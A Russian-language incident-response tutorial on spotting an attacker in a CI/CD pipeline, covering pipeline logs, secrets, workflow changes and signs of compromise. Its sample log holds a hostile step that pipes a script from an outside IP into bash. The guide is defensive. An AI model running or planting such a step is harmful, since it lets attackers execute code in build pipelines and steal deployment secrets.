## Вопрос, с которого всё начинается

Подозрение: атакующий внедрился в **CI/CD** и меняет сборки. Пайплайн — идеальное место
для persistence: код собирается с правами деплоя. Разберём.

## Наш пример: облачный пайплайн

## Шаг 1: что такое CI/CD

Пайплайн (GitHub Actions/GitLab CI/Jenkins) выполняет шаги сборки/деплоя. У него есть:

- **секреты** (токены, ключи);
- **права** (деплой, доступ к облаку);
- **триггеры** (push, PR, расписание).

## Шаг 2: логи пайплайна

```
$ gh run view 12345 --log | head
Run build
  step: checkout
  step: install deps
  step: curl http://203.0.113.5/x | bash
```

Незнакомый шаг — прямой признак компромисса.

## Шаг 3: секреты

Секреты хранятся в пайплайне и подставляются в окружение:

```
env:
  AWS_SECRET_ACCESS_KEY: ***
```

Атакующий может:

- вывести секрет в лог (`echo $SECRET`);
- отправить его на свой сервер;
- использовать для доступа к облаку.

Ищи в логах утечки (маскируются, но не всегда).

## Шаг 4: следы в коде

- изменения в `.github/workflows/` или `.gitlab-ci.yml`;
- новые шаги, ссылающиеся на внешние скрипты;
- подменённые зависимости (supply chain);
- коммиты от необычных авторов.

```
$ git log --oneline -- .github/workflows/
```

## Шаг 5: что искать

- изменение конфигурации пайплайна;
- незнакомые шаги/скрипты;
- утечки секретов;
- использование прав пайплайна (создание ресурсов в облаке);
- коммиты в нерабочее время.

## Что мы теперь знаем

- CI/CD имеет секреты и широкие права.
- Логи пайплайна фиксируют шаги.
- Секреты могут утечь в логи.
- Изменения workflow — ключевой признак.
- Сопоставляй коммиты и API-логи облака.

## Если не сработало

- Логи короткие? Смотри историю запусков.
- Секреты маскированы? Проверь поведение (доступ к облаку).
- Нужен коммит? Читай git-историю.
